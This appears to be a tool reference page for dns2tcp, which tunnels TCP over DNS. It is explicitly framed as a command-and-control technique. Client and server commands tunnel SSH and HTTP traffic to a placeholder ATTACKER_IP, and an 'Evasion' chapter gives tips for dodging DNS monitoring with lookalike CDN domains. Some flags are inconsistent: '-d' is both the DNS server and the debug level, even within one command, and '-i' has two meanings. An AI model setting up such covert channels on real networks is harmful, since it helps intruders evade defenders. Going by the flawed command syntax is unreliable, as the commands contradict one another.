---
title: "dns2tcp - TCP over DNS Tunnel"
description: "Tunnel TCP connections through DNS queries using DNS TXT, NULL, or ANY record types"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "dns2tcp"
kali_install: "sudo apt install dns2tcp"
---

# dns2tcp

## Overview

dns2tcp tunnels TCP connections through DNS queries. It encapsulates TCP data within DNS queries and responses, using TXT, NULL, or ANY record types. dns2tcp is designed for environments where only DNS resolution is permitted, providing a covert channel for command and control operations.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt install dns2tcp
```

### Verify Installation

```bash
dns2tcp -h
```

## Chapter 2: Basic Usage

### Start Server

```bash
dns2tcp -f /etc/dns2tcpd.conf -i ATTACKER_IP -p 53
```

**Explanation**: Starts the dns2tcp server using the configuration file. The `-i` flag specifies the listening IP, and `-p` sets the DNS port. The server listens for DNS queries and establishes TCP connections to configured targets.

### Configuration File

```
# /etc/dns2tcpd.conf
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22, http:127.0.0.1:80
```

**Explanation**: The configuration defines the listening address, port, domain for DNS queries, shared key, and resource mappings. Resources map local port names to remote host:port combinations.

### Connect Client

```bash
dns2tcp -r ssh -k secretkey -d ATTACKER_IP
```

**Explanation**: The `-r` flag specifies the resource to connect to (mapped in the server config), `-k` provides the shared key, and `-d` specifies the DNS server IP.

## Chapter 3: DNS Tunneling Concepts

### How DNS Tunneling Works

DNS tunneling encodes TCP data within DNS queries. The client sends DNS queries to the attacker's domain, and the server responds with encoded data. This creates a bidirectional channel through DNS traffic.

**Explanation**: DNS queries normally resolve hostnames to IP addresses. DNS tunneling repurposes the query/response mechanism to carry arbitrary data, bypassing firewalls that permit DNS resolution.

### Record Types

```bash
# TXT records (most common)
dns2tcp -r ssh -k key -d ATTACKER_IP -t TXT

# NULL records
dns2tcp -r ssh -k key -d ATTACKER_IP -t NULL

# ANY records
dns2tcp -r ssh -k key -d ATTACKER_IP -t ANY
```

**Explanation**: Different DNS record types carry different amounts of data per query. TXT records typically support larger payloads, while NULL records may be less monitored by security devices.

## Chapter 4: Server Configuration

### Basic Server Config

```
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22
```

**Explanation**: The server listens for DNS queries for `tunnel.example.com` on port 53. When it receives a query with the correct key, it establishes a TCP connection to `127.0.0.1:22` and tunnels the data.

### Multiple Resources

```
resources = ssh:10.0.0.1:22, web:10.0.0.2:80, db:10.0.0.3:3306
```

**Explanation**: Multiple resources can be configured, each mapped to a different target. Clients specify which resource to use when connecting.

### Forwarding Mode

```
forward = yes
```

**Explanation**: When forwarding is enabled, the server forwards non-dns2tcp DNS queries to upstream DNS servers. This allows the DNS server to function normally while also handling tunnel traffic.

## Chapter 5: Client Usage

### SSH Tunnel

```bash
# Start dns2tcp client
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -p 53 -l 127.0.0.1:2222

# Connect via SSH
ssh -p 2222 user@127.0.0.1
```

**Explanation**: The client creates a local port 2222 that tunnels through DNS to the remote SSH server. SSH connections to localhost:2222 are tunneled through DNS queries to the attacker's domain.

### HTTP Tunnel

```bash
dns2tcp -r web -k secretkey -d ATTACKER_IP -l 127.0.0.1:8080
```

**Explanation**: Creates a local port 8080 that tunnels HTTP traffic through DNS to the remote web server.

## Chapter 6: Performance

### Bandwidth Limitations

DNS tunneling has inherent bandwidth limitations due to:
- DNS query/response size limits (typically 512 bytes for UDP, 4096 for TCP)
- Network latency for each query/response pair
- Rate limiting by DNS resolvers

**Explanation**: DNS tunneling is not suitable for large data transfers. It is best used for lightweight C2 channels, SSH tunnels, and low-bandwidth applications.

### Optimization

```bash
# Use TCP DNS for larger payloads
dns2tcp -r ssh -k key -d ATTACKER_IP -p 53 -T

# Reduce query frequency
dns2tcp -r ssh -k key -d ATTACKER_IP -p 53 -i 100
```

**Explanation**: TCP DNS allows larger payloads than UDP DNS. The `-i` flag sets the interval between queries, allowing tuning of throughput vs. stealth.

## Chapter 7: Evasion

### DNS Traffic Analysis

DNS tunneling traffic can be detected by:
- Unusual query frequency
- High-entropy domain names
- Large DNS responses
- Non-standard record types

**Explanation**: Security monitoring tools analyze DNS traffic patterns. Using domain generation algorithms (DGA) and varying query patterns can reduce detection risk.

### Domain Configuration

```
domain = cdn.assets.example.com
```

**Explanation**: Using a domain name that resembles legitimate CDN or asset domains can help the tunnel traffic blend with normal DNS queries.

## Chapter 8: Troubleshooting

### Common Issues

```bash
# Test DNS resolution
dig tunnel.example.com

# Check server logs
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53 -d 3

# Debug client
dns2tcp -r ssh -k key -d ATTACKER_IP -d 3
```

**Explanation**: The `-d` flag with a number enables debug logging. Higher numbers provide more verbose output, helping identify connection and tunneling issues.

## Resources

- [dns2tcp Homepage](https://www.kali.org/tools/dns2tcp/)
- [DNS Tunneling Techniques](https://en.wikipedia.org/wiki/DNS_tunneling)
- [RFC 1035 - DNS](https://tools.ietf.org/html/rfc1035)
